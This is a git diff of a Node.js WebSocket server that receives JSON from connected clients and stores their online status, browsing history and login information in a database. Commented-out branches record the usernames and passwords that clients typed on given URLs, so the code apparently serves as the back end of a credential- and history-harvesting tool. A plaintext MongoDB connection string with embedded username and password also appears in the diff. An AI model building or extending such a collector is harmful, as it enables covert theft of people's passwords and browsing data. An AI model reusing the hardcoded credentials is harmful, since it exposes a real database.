@@ -20,11 +20,12 @@ git push origin master
 const express = require('express');
 const SocketServer = require('ws').Server;
 const path = require('path');
-//var mysql = require('mysql');
+var mysql = require('mysql');
+var database = require('./SQLdatabase.js');
 //var mongodb = require('mongodb');
 //var MongoClient = mongodb.MongoClient;
-var uri = 'mongodb://heroku_qk2c0q0j:i45p143m9dfcn4ocn1urpduu5c@ds037977.mlab.com:37977/heroku_qk2c0q0j';
-var mongoose = require ("mongoose");
+//var uri = 'mongodb://heroku_qk2c0q0j:i45p143m9dfcn4ocn1urpduu5c@ds037977.mlab.com:37977/heroku_qk2c0q0j';
+//var mongoose = require ("mongoose");
 
 const PORT = process.env.PORT || 3000;
 const INDEX = path.join(__dirname, 'index.html');
@@ -40,7 +41,7 @@ const wss = new SocketServer({ server });
 //TERMINOLOGY FOR MONGODB
 //collection=table
 //document=row
-
+/*
 var clientStatus = new mongoose.Schema({//Schemas are predefined json formats that the mongodc collections use, not all fields/values need to be filled out in order to push data to db
     id: {type: String},
     status: { type: String}
@@ -56,7 +57,6 @@ var clientPassword = new mongoose.Schema({
     url: { type: String},
     password: {type: String}
   });
-  */
 var clientHistory = new mongoose.Schema({
     id: {type: String},
     url: { type: String},
@@ -97,7 +97,7 @@ var mySQL_config = {
 var connection;
 function handleDisconnect() {
     console.log('1. connecting to db:');
-    connection = mysql.createConnection(mongoDB_config); // Recreate the connection, since
+    connection = mysql.createConnection(mySQL_config); // Recreate the connection, since
 													// the old one cannot be reused.
 
     connection.connect(function(err) {              	// The server is either down
@@ -133,7 +133,7 @@ MongoClient.connect(url, function (err, db) {
   });
   */
 
-
+/*
  mongoose.connect(uri, function (err, res) {//connect to db
     if (err) {
     console.log ('ERROR connecting to: ' + uri + '. ' + err);
@@ -141,20 +141,20 @@ MongoClient.connect(url, function (err, db) {
     console.log ('Succeeded connected to: ' + uri);
     }
   });
+  */
 //var db = mongoose.connection;
 var onlineClientsIDS = [];
 
-var userStatus = mongoose.model('Client Status', clientStatus);
-var userLogin = mongoose.model('Login Info', clientLogin);
+//var userStatus = mongoose.model('Client Status', clientStatus);
+//var userLogin = mongoose.model('Login Info', clientLogin);
 //var userPassword = mongoose.model('Login Info', clientPassword);
 
 
 wss.on('connection', function connection(ws) {//Upon a connection from a client
-    
-    console.log('Client connected');
+    //console.log(database.test("test string"));
+    console.log('A Client connected');
     ws.on('message', function incoming(message) {//Upon a message from a client
-
-        console.log('received: %s', message);
+        console.log('received json: \n', message);
         //ws.send(message);
         try{
         var data = JSON.parse(message);//turn message into JSON
@@ -162,32 +162,66 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
             console.log('wrong format detected')
             return;
         }
-        //console.log(message);
         ws.id = data.id;//get client id
-        if (onlineClientsIDS.indexOf(ws.id) === -1) {//checks to see if client is on online list, if not add it to lsit
-            onlineClientsIDS.push(ws.id);
-            var newUser = new userStatus ({
-                id: ws.id,
-                status : 'online'
-              });
-              userStatus.updateOne( { id: ws.id }, 
-                { status : 'online' }, { upsert : true }, function (err, val) {
-                    //finds a document that matches id , if found, change status to online
-                    //if not found add it
-                console.log(ws.id+" set to online");
-            } );
-            //newUser.save(function (err) {if (err) console.log ('Error on save!')});
-        }
-        else
-            console.log("id is already online");
-
         var type = data.type;
+        if (type=='online'){
+            if (onlineClientsIDS.indexOf(ws.id) === -1) {//checks to see if client is on online list, if not add it to lsit
+                console.log(ws.id+" connected");
+                onlineClientsIDS.push(ws.id);
+                //TODO send user id to database
+                database.setOnline(ws.id);//WORKS
 
-        //if (type == 'history')//history list
+                console.log(ws.id+" online status sent to server");
 
-        //if (type == 'cookie')//cookie
+            
+                /*
+                var newUser = new userStatus ({
+                    id: ws.id,
+                    status : 'online'
+                  });
+                  userStatus.updateOne( { id: ws.id }, 
+                    { status : 'online' }, { upsert : true }, function (err, val) {
+                        //finds a document that matches id , if found, change status to online
+                        //if not found add it
+                    console.log(ws.id+" set to online");
+                } );
+                */
+                //newUser.save(function (err) {if (err) console.log ('Error on save!')});
+            }
+            else
+                console.log("ERROR!!!:id is already online");
+        }
 
-        if (type == 'username'){//if message is telling us that client typed in username
+        else if (type == 'history'){//history list
+            var history = data.history;
+            //TODO SEND HISTORY TO DATABASE
+
+            database.updateHistory(message);
+        
+        }
+
+        //else if (type == 'cookie'){//cookie
+
+        else if (type == 'info'){
+            database.updateLoginInfo(message);
+
+        }
+        else if (type == 'getClients'){
+            //var userStatus=database.getAllStatus();
+            
+            database.getAllStatus(function(userStatus){
+                console.log(userStatus);
+            });
+            //console.log(userStatus);
+            //var test = JSON.stringify(clientArr);
+            //ws.send(JSON.stringify(database.getAllStatus()));
+        }
+
+
+
+        //}
+
+        /*else if (type == 'username'){//if message is telling us that client typed in username
             ws.id=data.id;
             ws.url=data.url;//get url from message
             ws.username=data.username;//get username from message
@@ -236,7 +270,7 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
             newPassword.save(function (err) {if (err) console.log ('Error on save!')});
             console.log(newPassword+" sent to db");
         }
-
+        */
 
         //SENDING DATA
 
@@ -250,11 +284,15 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
     });
 
     ws.on('close', function (){ //when a client disconnects
-        console.log('Client disconnected')});
+        console.log(ws.id +' disconnected')
         var index = onlineClientsIDS.indexOf(ws.id);
-        if (index > -1) {//remove him from active clients array
+        if (index > -1) {//remove id from active clients array
             onlineClientsIDS.splice(index, 1);
+            //TODO SET ID IN ACTIVE USERS DATABASE TO OFFLINE
+            database.setOffline(ws.id);
         }
-
+        else
+            console.log("ERROR!!!; id not in online id array");
+    });
             
 });
